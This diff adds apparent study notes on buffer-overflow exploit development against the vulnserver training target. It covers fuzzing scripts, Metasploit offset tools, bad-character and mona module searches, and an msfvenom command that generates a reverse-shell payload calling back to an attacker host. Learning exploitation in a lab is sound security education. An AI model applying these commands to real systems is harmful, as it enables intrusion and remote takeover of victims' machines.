@@ -153,6 +153,71 @@ dnsrecon -r 127.0.0.0/24 -n myip -d domain
 
 
 
+#Exploit Development (Buffer Overflows)
+Resources
+    - win evaluation 10 enterprise
+    - https://www.immunityinc.com/products/debugger/
+    - vulnserver on victim machine - http://thegreycorner.com/vulnserver.html
+kernel(top) -> stack -> heap -> Data -> Text(bottom)
+Stack
+    - Extended Stack Pointer(ESP)(top)
+    - Buffer Space
+    - Extended Base Pointer(EBP)(bottom)
+    - Extended Instruction Pointer(EIP)/Return Address
+Overload buffer space to EIP.
+Steps
+    - Spiking - find vuln part
+    - Fuzzing - send xxcters to break
+    - Find offset - where program breaks
+    - Overwrite EIP - overwrite pointer address
+    - Find bad xxcters
+    - Find the right module
+    - Generate shellcode(point EIP to shellcode)
+    - Be root
+    
+vulnserver and immunity as admin.
+attach process, play
+kali    - nc -nv 192.168.1.100 9999
+
+       #spiking
+        - pluma stats.spk
+                s_readline();
+                s_string("STATS ");
+                s_string_variable("0");
+        - generic_send_tcp 192.168.1.100 9999 stats.spk 0 0
+
+        #fuzzing 
+        - pluma trun.spk
+              s_readline();
+              s_string("TRUN ");
+              s_string_variable("0");
+        - generic_send_tcp 192.168.1.100 9999 trun.spk 0 0
+
+        #find offset
+        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
+        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 386F4337(EIP addr)
+
+        #find bad chars
+        https://github.com/cytopia/badchars
+        follow in dump and check missing seq nums
+        in successive seq assume first char as bad
+
+        #find right module - some dll without memory protection(no death, aslr, safeseh)
+        https://github.com/corelan/mona
+        mona.py in pycommands folder(immunity debugger)
+        opcode equiv (nasm_shell)
+        /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+            JMP ESP
+        !mona find -s "\xff\xe4" -m essfunc.dll
+        
+        #gen shellcode and get root
+        msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+        
+
+
+
+
+
 
 
 
